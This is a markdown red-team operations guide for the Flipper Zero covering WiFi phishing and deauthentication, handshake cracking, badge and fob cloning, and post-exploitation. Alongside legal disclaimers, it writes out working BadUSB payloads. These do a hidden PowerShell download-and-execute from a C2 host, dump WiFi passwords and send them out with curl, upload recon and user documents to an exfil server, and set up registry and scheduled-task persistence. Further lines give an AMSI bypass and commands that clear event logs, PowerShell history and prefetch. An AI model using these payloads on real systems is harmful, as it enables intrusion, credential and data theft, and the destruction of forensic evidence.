# Flipper Zero Red Team Operations Guide

> **🔴 CRITICAL LEGAL NOTICE**: This guide is EXCLUSIVELY for authorized red team operations, professional penetration testing, and security research conducted with explicit written permission. Unauthorized use of these techniques is illegal and unethical. All techniques described require proper authorization, scope documentation, and rules of engagement.

## Table of Contents

- [Introduction](#introduction)
- [Pre-Engagement Requirements](#pre-engagement-requirements)
- [Operational Security (OPSEC)](#operational-security-opsec)
- [WiFi Offensive Operations](#wifi-offensive-operations)
- [Physical Access Attacks](#physical-access-attacks)
- [Social Engineering Support](#social-engineering-support)
- [Post-Exploitation Techniques](#post-exploitation-techniques)
- [Evasion & Anti-Forensics](#evasion--anti-forensics)
- [Reporting & Documentation](#reporting--documentation)
- [Red Team Tool Integration](#red-team-tool-integration)
- [Legal Framework](#legal-framework)
- [Resources](#resources)

---

## Introduction

The Flipper Zero, when properly configured with Momentum firmware and WiFi dev board, serves as a covert multi-vector attack platform for authorized red team operations. This guide focuses on offensive security techniques for:

- **Physical Penetration Testing**: Bypassing physical access controls
- **Wireless Network Attacks**: WiFi and RF exploitation
- **Social Engineering**: Technical support for pretexting
- **Post-Exploitation**: Maintaining persistence and lateral movement
- **Purple Team Exercises**: Validation of defensive controls

**Philosophy**: Every attack vector demonstrated should improve defensive posture. Red teaming without improving blue team capabilities is just breaking things.

---

## Pre-Engagement Requirements

### Required Documentation

Before ANY red team operation:

1. **Rules of Engagement (RoE)**
   - Scope: Networks, systems, physical locations
   - Time windows for testing
   - Escalation procedures
   - Out-of-scope targets (critical systems, production data)
   - Emergency stop procedures

2. **Authorization Letters**
   - Signed by C-level or legal authority
   - Specific permission for wireless attacks
   - Physical access authorization
   - Badge cloning permissions
   - Get-out-of-jail-free letter for law enforcement encounters

3. **Legal Review**
   - Compliance with CFAA and state laws
   - Review FCC regulations for RF transmission
   - Data handling and privacy requirements
   - International considerations if applicable

4. **Insurance & Liability**
   - Professional liability coverage
   - Errors & omissions insurance
   - Indemnification clauses

### Pre-Op Checklist

```text
[ ] Authorization letter signed and dated
[ ] Scope clearly defined and documented
[ ] Emergency contacts established
[ ] Client security team notified (if white/grey box)
[ ] Backup communication channels tested
[ ] Equipment inventory documented
[ ] OPSEC procedures reviewed
[ ] Legal counsel consulted if needed
[ ] Data handling procedures established
[ ] Reporting templates prepared
```

---

## Operational Security (OPSEC)

### Physical OPSEC

**Device Configuration**:

- Remove identifying information from Flipper
- Use generic device names
- Disable Bluetooth when not needed
- Configure screen timeout to 30 seconds
- Use lock code on device

**Operational Considerations**:

- Flipper is conspicuous—have a cover story ready
- Common covers: "Developer tool", "RF analyzer", "Hardware debugging"
- Carry authorization letter at all times
- Know how to quickly demonstrate legitimacy

**Anti-Detection**:

```text
Settings → Desktop → Lock with PIN
Settings → Bluetooth → Forget Unused Devices
Settings → System → Device Name: "ESP32-DevKit" (less suspicious)
```

### Digital OPSEC

**Data Hygiene**:

- Encrypt SD card contents
- Clear capture files after exfiltration
- No PII stored on device
- Regular secure wipe of temporary data

**Communication Security**:

- Use encrypted channels for reporting
- Avoid client WiFi for sensitive communications
- VPN all data exfiltration
- Sanitize screenshots and captures

---

## WiFi Offensive Operations

### Reconnaissance

#### Passive Scanning

**Goal**: Map wireless environment without detection

```text
Apps → GPIO → WiFi Marauder → Sniff → Beacon
```

**Intelligence Gathered**:

- SSID enumeration
- BSSID/MAC addresses
- Channel utilization
- Encryption types (WEP/WPA/WPA2/WPA3)
- Hidden SSIDs (via probe requests)
- Client device enumeration

**Pro Tips**:

- Capture for 15-30 minutes for full picture
- Note strongest signals (likely target locations)
- Identify guest/employee network separation
- Document vendor OUIs for device profiling

#### Active Scanning

**Goal**: Enumerate clients and test responsiveness

```text
Apps → GPIO → WiFi Marauder → Scan → Probe
```

**Yields**:

- Active client devices
- Probe request patterns
- Device movement tracking
- Network association behaviors

### Credential Attacks

#### Evil Portal (Captive Portal Phishing)

**Goal**: Harvest credentials via fake captive portal

```text
Apps → GPIO → WiFi Marauder → Evil Portal
```

**Attack Flow**:

1. Deauth clients from legitimate AP
2. Present evil twin with identical SSID
3. Serve captive portal requesting credentials
4. Capture credentials when submitted
5. Allow connection to real network (optional)

**Portal Customization**:

- Clone legitimate captive portal design
- Use target organization branding
- Match expected login flow
- Include plausible error messages

**Advanced Techniques**:

- Karma attack (respond to all probe requests)
- Selective targeting based on MAC addresses
- Multi-stage authentication mimicry
- SSL/TLS certificate spoofing prep

#### WPA2 Handshake Capture

**Goal**: Capture 4-way handshake for offline cracking

```text
Apps → GPIO → WiFi Marauder → Sniff → PMKID/Handshake
```

**Process**:

1. Identify target AP and channel
2. Start handshake capture
3. Deauth client to force re-authentication
4. Capture handshake packets
5. Exfiltrate PCAP for offline cracking

**Optimization**:

- Target APs with active clients
- Use short, targeted deauth bursts
- Capture from physically close position
- Multiple deauth attempts if needed

**Offline Cracking Setup**:

```bash
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt

# Or use john
john --wordlist=wordlist.txt --format=wpapsk hash.txt
```

### Denial of Service

#### Deauthentication Attacks

**Goal**: Disrupt wireless connectivity

```text
Apps → GPIO → WiFi Marauder → Deauth → [Select target]
```

**Attack Types**:

- **Broadcast deauth**: All clients on AP
- **Targeted deauth**: Specific client MAC
- **Continuous**: Sustained disruption
- **Burst**: Short, repeated attacks

**Use Cases in Red Team Ops**:

- Force users to wired connections (traffic visibility)
- Test wireless IDS/IPS detection
- Assess business continuity procedures
- Validate backup connectivity methods
- Create diversion for other operations

**Detection Considerations**:

- Generates significant management frame traffic
- Modern WMF (Wireless Management Frame) protection detects this
- Many enterprise WIPs will alert immediately
- High-visibility attack, use strategically

#### Channel Jamming

**Goal**: RF interference to deny service

**Techniques**:

- Beacon flood (overwhelming with fake APs)
- Channel saturation (continuous transmission)
- Adjacent channel interference

**Limitations**:

- Illegal in most jurisdictions without specific authorization
- Difficult to attribute to physical security test
- Requires very specific RoE allowance

---

## Physical Access Attacks

### RFID/NFC Badge Cloning

#### Reconnaissance Phase

**Goal**: Identify badge technology without raising suspicion

```text
NFC → Read → Save
```

**Information Gathering**:

- Badge frequency (125 kHz vs 13.56 MHz)
- Protocol identification (HID, MIFARE, etc.)
- Facility codes and card numbers
- Access level indicators
- Badge printing/visual security features

**Covert Reading Techniques**:

- "Accidental" proximity in elevators
- Shoulder surfing badge presentations
- Dropped item pickups near targets
- Social engineering for badge inspection

#### Cloning Operations

**125 kHz (HID Prox, EM4100)**:

```text
125 kHz RFID → Read → Save → Emulate
```

**Attack Vector**:

1. Capture badge data during social interaction
2. Save to Flipper or SD card
3. Emulate at access control reader
4. Document successful access
5. Test additional doors/systems

**13.56 MHz (MIFARE Classic)**:

```text
NFC → Read → Save → Emulate
```

**Advanced MIFARE Attacks**:

- Nested attack for key recovery
- Darkside attack on vulnerable implementations
- Dictionary attack with common keys
- Sector-by-sector cloning

**MIFARE Classic Key Recovery**:

```text
NFC → Read → Detect → [Wait for analysis]
NFC → Saved → [Emulate cloned card]
```

#### Badge Creation

**Goal**: Create physical badge for extended operations

**Materials**:

- Blank RFID/NFC cards
- Proxmark3 (for writing, if needed)
- Badge printer access (internal recon target)
- Holographic overlays (visual authenticity)

**Process**:

1. Clone badge data to writable card
2. Print visual replica (if printer access obtained)
3. Add holographic security features
4. Artificial wear to match age
5. Test before critical use

### Magnetic Stripe Attacks

**Reading Mag Stripes**:

```text
125 kHz RFID → Read → [Some magstripe support in plugins]
```

**Alternative**: USB magstripe reader for exfiltration

**Common Applications**:

- Hotel room keys (though moving to RFID)
- Legacy access control
- Payment cards (PCI-DSS compliance test)
- Employee time clocks

### Key Fob Replication

#### Sub-GHz Signal Capture

**Goal**: Clone remote access devices

```text
Sub-GHz → Read → [Capture signal] → Save
Sub-GHz → Saved → Emulate
```

**Common Targets**:

- Parking garage remotes
- Building access fobs
- Vehicle key fobs (older models)
- Automated gate systems
- Wireless alarm panels

**Attack Methodology**:

1. Identify transmission frequency
2. Capture during legitimate use
3. Analyze for rolling codes
4. Test replay attack success
5. Document access gained

**Rolling Code Challenges**:

- Modern systems use rolling/hopping codes
- Simple replay attacks fail
- Requires more sophisticated RF analysis
- May need SDR for advanced attacks
- Consider RollJam techniques (separate hardware)

### iButton Exploitation

```text
iButton → Read → Save → Emulate
```

**Target Systems**:

- Legacy building access
- Server room entry
- Industrial control systems
- Utility infrastructure
- Government facilities (older installations)

**Attack Scenarios**:

- Dumpster diving for discarded keys
- Social engineering for temporary access
- Photography of key patterns
- Physical impressioning techniques

---

## Social Engineering Support

### Pretexting Enhancement

## Scenario: IT Support Pretext**

- Flipper as "diagnostic tool"
- BadUSB for "troubleshooting"
- WiFi scanning for "network analysis"
- Appears legitimate to non-technical staff

## Scenario: Facilities/Maintenance**

- RFID reader for "access control testing"
- Sub-GHz for "remote system testing"
- GPIO for "sensor calibration"
- High-vis vest + clipboard + Flipper = access

## Scenario: Security Auditor**

- Most legitimate appearing
- Aligns with actual use case
- Can openly test systems
- Requires good documentation

### Information Gathering

**Target Intelligence**:

- Badge technology documentation
- WiFi infrastructure mapping
- RF environment characterization
- Physical security control identification

**USB Drop Operations**:

```text
BadUSB → [Payload] → Deploy in target area
```

**Payloads**:

- Reverse shell establishment
- Credential harvesting
- Network reconnaissance
- Persistence mechanisms
- Beacon/callback scripts

---

## Post-Exploitation Techniques

### BadUSB Payloads

#### Initial Access

**Goal**: Establish foothold on target system

```text
BadUSB → windows_reverse_shell.txt → Run
```

**Reverse Shell Example**:

```text
REM Windows Reverse Shell via PowerShell
REM Target: Windows 10/11
REM Payload: Encrypted PowerShell reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -W Hidden -NoP -NonI -Exec Bypass
ENTER
DELAY 1000
STRING IEX (New-Object Net.WebClient).DownloadString('http://[C2-SERVER]/payload.ps1')
ENTER
```

**Obfuscation Techniques**:

- Base64 encoded commands
- XOR encryption
- String concatenation
- Environment variable abuse
- AMSI bypass prepended

#### Credential Harvesting

**Goal**: Extract credentials from unlocked workstation

```text
BadUSB → credential_dump.txt → Run
```

**Techniques**:

- Mimikatz execution
- LSASS memory dump
- SAM/SYSTEM registry extraction
- Browser credential extraction
- WiFi password extraction
- Clipboard monitoring

**Example Payload**:

```text
REM Quick credential extraction
DELAY 1000
GUI r
DELAY 500
STRING cmd /c powershell -W Hidden (netsh wlan show profiles) | Select-String -Pattern 'All User Profile' | ForEach-Object {$_ -replace 'All User Profile     : ',''} | ForEach-Object {netsh wlan show profile name=$_ key=clear} > %TEMP%\wifi.txt && curl -F file=@%TEMP%\wifi.txt http://[EXFIL-SERVER] && del %TEMP%\wifi.txt
ENTER
```

#### Network Reconnaissance

**Goal**: Map internal network from compromised host

```text
REM Network reconnaissance script
DELAY 1000
CTRL ESC
DELAY 500
STRING cmd
CTRL SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
STRING cd %TEMP% && echo ipconfig /all > recon.bat
ENTER
STRING echo arp -a >> recon.bat
ENTER
STRING echo route print >> recon.bat
ENTER
STRING echo nslookup [domain] >> recon.bat
ENTER
STRING recon.bat > recon.txt && certutil -encode recon.txt recon.b64
ENTER
STRING powershell Invoke-WebRequest -Uri http://[EXFIL]/upload -Method POST -InFile recon.b64
ENTER
```

#### Persistence Establishment

**Goal**: Maintain access to compromised system

**Registry Run Key**:

```text
REM Add persistence via Registry Run key
STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell -W Hidden -NoP -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://[C2]/beacon.ps1')" /f
ENTER
```

**Scheduled Task**:

```text
STRING schtasks /create /tn "WindowsUpdate" /tr "powershell -W Hidden [PAYLOAD]" /sc onlogon /rl highest /f
ENTER
```

### Data Exfiltration

**Small Data via BadUSB**:

```text
REM Exfil sensitive files
STRING $files = Get-ChildItem -Path C:\Users\[TARGET]\Documents -Include *.docx,*.xlsx,*.pdf -Recurse; foreach ($file in $files) {Invoke-WebRequest -Uri http://[EXFIL]/upload -Method POST -InFile $file.FullName}
ENTER
```

**DNS Exfiltration**:

- Encode data in DNS queries
- Bypass egress filtering
- Low-and-slow exfiltration
- Requires external DNS server control

---

## Evasion & Anti-Forensics

### AV/EDR Evasion

**PowerShell Evasion**:

```text
# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution policy bypass
powershell -Exec Bypass -NoProfile -NonInteractive

# Obfuscation
powershell -W Hidden -EncodedCommand [BASE64]
```

**Payload Encoding**:

```bash
# Base64 encode payload
echo 'IEX (New-Object Net.WebClient).DownloadString("http://[C2]/payload.ps1")' | iconv -t UTF-16LE | base64 -w 0
```

### Clearing Tracks

**Windows Event Log Clearing**:

```text
REM Clear security logs (requires admin)
STRING wevtutil cl Security
ENTER
STRING wevtutil cl System
ENTER
STRING wevtutil cl Application
ENTER
```

**PowerShell History Clearing**:

```text
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
ENTER
```

**Prefetch Clearing**:

```text
STRING del /f /q C:\Windows\Prefetch\*
ENTER
```

### Anti-Forensics

**Timestomping**:

- Modify file timestamps
- Match surrounding files
- Avoid detection patterns
- Use PowerShell or WMI

**Memory-Only Execution**:

- Reflective DLL injection
- Fileless malware techniques
- Process hollowing
- In-memory assembly loading

---

## Reporting & Documentation

### Evidence Collection

**Required Documentation**:

- Timestamp of each action
- System/network identifier
- Technique used
- Success/failure
- Defensive controls encountered
- Screenshots/screen recordings
- Captured credentials (hashed in report)
- Physical access gained

### Reporting Structure

```markdown
# Red Team Assessment Report
## Executive Summary
- Engagement duration
- Scope overview
- Key findings summary
- Business risk assessment

## Methodology
- Reconnaissance techniques
- Attack vectors attempted
- Tools and techniques
- Timeline of activities

## Findings
### Finding 1: [Title]
**Severity**: Critical/High/Medium/Low
**Attack Vector**: [Description]
**Evidence**: [Screenshots/logs]
**Impact**: [Business impact]
**Remediation**: [Specific recommendations]
**References**: [MITRE ATT&CK TTPs]

## Defensive Wins
- Controls that worked
- Detection successes
- Good security practices observed

## Recommendations
- Prioritized remediation steps
- Strategic improvements
- Detection opportunities
- Purple team suggestions

## Appendices
- Detailed timeline
- Tool configurations
- Payload source code
- Additional technical details
```

### MITRE ATT&CK Mapping

Map all techniques to MITRE ATT&CK framework:

- **Reconnaissance**: T1595 (Active Scanning)
- **Initial Access**: T1200 (Hardware Additions)
- **Credential Access**: T1056 (Input Capture)
- **Defense Evasion**: T1140 (Deobfuscate/Decode Files)
- **Discovery**: T1018 (Remote System Discovery)
- **Collection**: T1115 (Clipboard Data)
- **Exfiltration**: T1048 (Exfiltration Over Alternative Protocol)

---

## Red Team Tool Integration

### Complementary Tools

**Network Attacks**:

- **WiFi Pineapple**: Advanced rogue AP
- **Proxmark3**: Deep RFID/NFC analysis
- **HackRF**: Full-spectrum SDR
- **Bash Bunny**: Advanced BadUSB
- **LAN Turtle**: Network implant

**Physical Access**:

- **Under-door tools**: Door manipulation
- **Lock picks**: Physical bypass
- **Borescope**: Visual reconnaissance
- **Bump keys**: Quick entry
- **Shims**: Padlock bypass

**Post-Exploitation**:

- **Rubber Ducky**: Payload delivery
- **O.MG Cable**: Covert implant
- **Packet Squirrel**: Network MitM
- **Screen Crab**: HDMI capture
- **KeyGrabber**: Hardware keylogger

### Flipper Zero Integration Points

**C2 Communication**:

- Sub-GHz for beacon signaling
- WiFi for data exfiltration
- GPIO for custom sensors
- IR for covert signaling

**Physical Persistence**:

- Hidden Flipper deployment
- Remote-triggered payloads
- Environmental monitoring
- Covert data collection

---

## Legal Framework

### Authorization Requirements

**Minimum Requirements**:

1. Written authorization from legal authority
2. Clear scope definition
3. Time-bound engagement
4. Emergency contact procedures
5. Data handling agreements
6. Non-disclosure agreements
7. Liability limitations

### Scope Management

**In-Scope Activities** (example):

- Wireless network testing
- Physical access attempts
- Social engineering (with limits)
- System compromise (designated targets)
- Credential harvesting (test accounts)

**Out-of-Scope Activities** (example):

- Production database access
- PII exfiltration
- DoS on critical systems
- Third-party systems
- After-hours physical access

### Risk Management

**Risk Categories**:

- **Technical**: System damage, data loss
- **Legal**: Unauthorized access claims
- **Reputational**: Public disclosure
- **Operational**: Business disruption
- **Personal**: Physical safety

**Mitigation Strategies**:

- Clear RoE documentation
- Regular client communication
- Incremental testing approach
- Immediate issue reporting
- Professional liability insurance

---

## Resources

### Training & Certifications

- **OSCP**: Offensive Security Certified Professional
- **OSEP**: Offensive Security Experienced Penetration Tester
- **OSCE**: Offensive Security Certified Expert
- **GXPN**: GIAC Exploit Researcher and Advanced Penetration Tester
- **CRTO**: Certified Red Team Operator
- **PNPT**: Practical Network Penetration Tester

### Frameworks & Methodologies

- **MITRE ATT&CK**: Attack technique database
- **PTES**: Penetration Testing Execution Standard
- **OWASP**: Testing guides and resources
- **Red Team Field Manual**: Quick reference
- **RTFM**: Red Team operations manual

### Community Resources

- **Flipper Zero Discord**: Active development community
- **GitHub - Awesome Flipper**: Curated resources
- **Hak5 Forums**: Hardware hacking community
- **NetSec Reddit**: Security discussions
- **PentesterLab**: Hands-on training

### Legal Resources

- **EFF**: Electronic Frontier Foundation guidance
- **CFAA Resources**: Understanding computer fraud laws
- **FCC Regulations**: RF transmission rules
- **State Laws**: Computer crime statutes by jurisdiction

---

## Ethical Considerations

### Professional Responsibility

Red team operators must:

- Operate within explicit authorization
- Minimize collateral damage
- Report vulnerabilities responsibly
- Protect client confidentiality
- Maintain professional standards
- Consider broader impacts

### Purple Team Mindset

Every red team operation should:

- Improve blue team detection
- Validate defensive controls
- Enhance incident response
- Build organizational resilience
- Foster security culture

**Remember**: The goal is not to "win" against the blue team—it's to make the organization more secure.

---

## Conclusion

The Flipper Zero is a powerful tool for authorized red team operations, but its effectiveness depends on:

1. **Proper Authorization**: Never operate without it
2. **Skill Development**: Know your tools deeply
3. **Operational Security**: Don't get caught unnecessarily
4. **Ethical Conduct**: Stay within bounds
5. **Effective Reporting**: Make findings actionable

**Final Thought**: "The needs of the many outweigh the needs of the few"—your red team operations should ultimately serve the greater security good of the organization.

---

## Disclaimer

This guide is provided for authorized red team operations and professional penetration testing ONLY. Any use of these techniques without explicit written permission is illegal and unethical. The author(s) assume no liability for misuse of this information.

**If you don't have a signed authorization letter in your hand right now, close this guide and get one.**

---

## License

This guide is released under MIT License for educational purposes. Redistribution must include all disclaimers and legal notices.

---
